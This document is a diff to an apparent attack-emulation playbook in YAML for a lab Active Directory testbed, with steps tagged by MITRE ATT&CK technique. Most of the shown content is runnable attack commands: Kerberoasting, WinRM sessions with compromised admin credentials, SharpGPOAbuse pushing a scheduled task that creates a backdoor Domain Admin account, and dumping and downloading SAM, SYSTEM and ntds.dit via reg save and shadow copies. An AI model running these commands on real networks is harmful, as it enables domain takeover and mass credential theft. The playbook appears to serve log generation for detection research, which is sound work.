@@ -69,7 +69,7 @@ commands:
   - type: shell
     session: winrm_domain_user
     interactive: true
-    cmd: "C:\\\\Users\\\\Public\\\\msf.exe\n"
+    cmd: "C:\\Users\\Public\\msf.exe\n"
 
   - type: msf-session
     session: msfshell_local_admin
@@ -151,6 +151,8 @@ commands:
       tactics: "Credential Access"
       technique_name: "Steal or Forge Kerberos Tickets: Kerberoasting"
 
+### Usually we would now crack the hash offline
+### This does not generate logs however, just write a debug message to save some time
   - type: debug
     cmd: Cracking the hash of wsadmin obtained through kerberoasting offline ...
 
@@ -172,17 +174,31 @@ commands:
   - type: shell
     session: winrm_domain_admin
     interactive: true
-    cmd: "$Username = \"$COMPROMISED_ADMIN_USERNAME\"; $Password = \"$COMPROMISED_ADMIN_PASSWORD\"; $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force; $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword); $Session = New-PSSession -ComputerName DC1 -Credential $credential;\n"
-    
-  - type: shell
-    session: winrm_domain_admin
-    interactive: true
-    cmd: "Copy-Item -Path C:\\\\Users\\\\Public\\\\SharpGPOAbuse.exe -ToSession $Session -Destination C:\\\\Users\\\\Public;\n"
+    cmd: "$Username = \"$COMPROMISED_ADMIN_USERNAME\"; $Password = \"$COMPROMISED_ADMIN_PASSWORD\"; $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force; $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword); $Session = New-PSSession -ComputerName DC1 -Credential $Credential;\n"
 
   - type: shell
     session: winrm_domain_admin
     interactive: true
-    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { Write-Output \"New-ADUser -Name mnisdfbgudfgl -AccountPassword (ConvertTo-SecureString 'P@ssword' -AsPlainText -Force) -Enabled 1\" > C:\\\\Users\\\\Public\\\\useradd.ps1; Write-Output \"Add-ADGroupMember -Identity 'Domain Admins' -Members mnisdfbgudfgl\" >> C:\\\\Users\\\\Public\\\\useradd.ps1; New-GPO -name 'mnisdfbgudfgl'; New-GPLINK -name 'mnisdfbgudfgl' -target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com'; C:\\\\Users\\\\Public\\\\SharpGPOAbuse.exe --AddComputerTask --GPOName mnisdfbgudfgl --Author $COMPROMISED_ADMIN_USERNAME --TaskName 'mnisdfbgudfgl' --Command 'powershell.exe' --Arguments 'powershell.exe -ep bypass C:\\\\Users\\\\Public\\\\useradd.ps1'; gpupdate /force }\n"
+    cmd: "Copy-Item -Path C:\\Users\\Public\\SharpGPOAbuse.exe -ToSession $Session -Destination C:\\Users\\Public;\n"
+
+### Arguments in SharpGPOAbuse seem to be limited in length, write payload to a PowerShell script instead
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { Write-Output \"New-ADUser -Name $BACKDOOR_NAME -AccountPassword (ConvertTo-SecureString 'P@ssword' -AsPlainText -Force) -Enabled 1\" > C:\\Users\\Public\\adduser.ps1; Write-Output \"Add-ADGroupMember -Identity 'Domain Admins' -Members $BACKDOOR_NAME\" >> C:\\Users\\Public\\adduser.ps1; }\n"
+
+### Generate a random backdoor GPO name so we can run the playbook multiple times without having to worry about duplicate GPO names if it is not removed
+  - type: shell
+    cmd: tr -dc A-Za-z0-9 </dev/urandom | head -c 10
+
+  - type: setvar
+    cmd: $RESULT_STDOUT
+    variable: $BACKDOOR_NAME
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { New-GPO -Name \"$BACKDOOR_NAME\"; New-GPLINK -Name \"$BACKDOOR_NAME\" -Target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com'; C:\\Users\\Public\\SharpGPOAbuse.exe --AddComputerTask --GPOName $BACKDOOR_NAME --Author $COMPROMISED_ADMIN_USERNAME --TaskName \"$BACKDOOR_NAME\" --Command 'powershell.exe' --Arguments 'powershell.exe -ep bypass C:\\Users\\Public\\adduser.ps1'; gpupdate /force }\n"
     metadata:
       techniques: "T1484.001"
       tactics: "Defense Evasion, Privilege Escalation"
@@ -191,40 +207,66 @@ commands:
   - type: shell
     session: winrm_domain_admin
     interactive: true
-    cmd: "upload $PAYLOADS_DIR/Invoke-NinjaCopy.ps1 C:\\\\Users\\\\Public\\\\Invoke-NinjaCopy.ps1\n"
-
-  - type: shell
-    session: winrm_domain_admin
-    interactive: true
-    cmd: "Copy-Item -Path C:\\\\Users\\\\Public\\\\Invoke-NinjaCopy.ps1 -ToSession $Session -Destination C:\\\\Users\\\\Public; Invoke-Command -Session $Session -ScriptBlock { Import-Module C:\\\\Users\\\\Public\\\\Invoke-NinjaCopy.ps1; Invoke-NinjaCopy -Path \"C:\\\\Windows\\\\System32\\\\Config\\\\SAM\" -LocalDestination \"C:\\\\Users\\\\Public\\\\SAM\"; Invoke-NinjaCopy -Path \"C:\\\\Windows\\\\System32\\\\Config\\\\SYSTEM\" -LocalDestination \"C:\\\\Users\\\\Public\\\\SYSTEM\"; Invoke-NinjaCopy -Path \"C:\\\\Windows\\\\NTDS\\\\ntds.dit\" -LocalDestination \"C:\\\\Users\\\\Public\\\\ntds.dit\"; }\n"
+    command_timeout: 30
+    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { reg.exe save HKLM\\SYSTEM C:\\Users\\Public\\SYSTEM.hive /y; reg.exe save HKLM\\SAM C:\\Users\\Public\\SAM.hive /y; vssadmin CREATE SHADOW /For=C:; $ShadowCopyVolume = (vssadmin list shadows | Select-String \"Shadow Copy Volume:\" | Select-Object -First 1).ToString().Split(\":\")[1].Trim(); cmd.exe /c copy $ShadowCopyVolume\\Windows\\NTDS\\ntds.dit c:\\Users\\Public\\ntds.dit; vssadmin delete shadows /All /Quiet }\n"
     metadata:
       techniques: "T1006"
       tactics: "Defense Evasion"
       technique_name: "Direct Volume Access"
 
-  - type: shell
-    session: winrm_domain_admin
-    interactive: true
-    cmd: "Copy-Item -Path C:\\Users\\Public\\SAM -FromSession $Session -Destination C:\\Users\\Public\\; Copy-Item -Path C:\\\\Users\\\\Public\\\\SYSTEM -FromSession $Session -Destination C:\\\\Users\\\\Public; Copy-Item -Path C:\\\\Users\\\\Public\\\\ntds.dit -FromSession $Session -Destination C:\\\\Users\\\\Public;\n"
-    metadata:
-      techniques: "T1006"
-      tactics: "Defense Evasion"
-      technique_name: "Direct Volume Access"
+### Invoke-Ninjacopy seems to be broken :(
+# - type: shell
+#   session: winrm_domain_admin
+#   interactive: true
+#   cmd: "upload $PAYLOADS_DIR/Invoke-NinjaCopy.ps1 C:\\\\Users\\\\Public\\\\Invoke-NinjaCopy.ps1\n"
+
+# - type: shell
+#   session: winrm_domain_admin
+#   interactive: true
+#   cmd: "Copy-Item -Path C:\\Users\\Public\\Invoke-NinjaCopy.ps1 -ToSession $Session -Destination C:\\Users\\Public; Invoke-Command -Session $Session -ScriptBlock { Import-Module C:\\Users\\Public\\Invoke-NinjaCopy.ps1; Invoke-NinjaCopy -Path \"C:\\Windows\\System32\\Config\\SAM\" -LocalDestination \"C:\\Users\\Public\\SAM\"; Invoke-NinjaCopy -Path \"C:\\Windows\\System32\\Config\\SYSTEM\" -LocalDestination \"C:\\Users\\Public\\SYSTEM\"; Invoke-NinjaCopy -Path \"C:\\Windows\\NTDS\\ntds.dit\" -LocalDestination \"C:\\Users\\Public\\ntds.dit\"; }\n"
+#   metadata:
+#     techniques: "T1006"
+#     tactics: "Defense Evasion"
+#     technique_name: "Direct Volume Access"
 
   - type: shell
     session: winrm_domain_admin
     interactive: true
-    cmd: "download C:\\\\Users\\\\Public\\\\SAM\n"
+    cmd: "Copy-Item -Path C:\\Users\\Public\\SAM.hive -FromSession $Session -Destination C:\\Users\\Public\\; Copy-Item -Path C:\\Users\\Public\\SYSTEM.hive -FromSession $Session -Destination C:\\Users\\Public; Copy-Item -Path C:\\Users\\Public\\ntds.dit -FromSession $Session -Destination C:\\Users\\Public;\n"
 
   - type: shell
     session: winrm_domain_admin
     interactive: true
-    cmd: "download C:\\\\Users\\\\Public\\\\SYSTEM\n"
+    cmd: "download C:\\\\Users\\\\Public\\\\SAM.hive\n"
 
   - type: shell
     session: winrm_domain_admin
     interactive: true
+    cmd: "download C:\\\\Users\\\\Public\\\\SYSTEM.hive\n"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    command_timeout: 30
     cmd: "download C:\\\\Users\\\\Public\\\\ntds.dit\n"
 
+### Usually we would now decrypt the ntds.dit offline
+### This does not generate logs however, just write a debug message to save some time
   - type: debug
     cmd: Decrypting ntds.dit offline ...
+
+### Optional: Cleanup DC1
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { Remove-GPLink -Name \"$BACKDOOR_NAME\" -Target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com' -Confirm:0; Remove-GPO -Name \"$BACKDOOR_NAME\" -Confirm:0; Remove-Item C:\\Users\\Public\\*.* -Force }\n"
+
+### Optional: Cleanup WEB
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "Remove-Item C:\\Users\\Public\\*.* -Force\n"
+
+### Optional: Cleanup KALI
+  - type: shell
+    cmd: rm *.hive *.dit
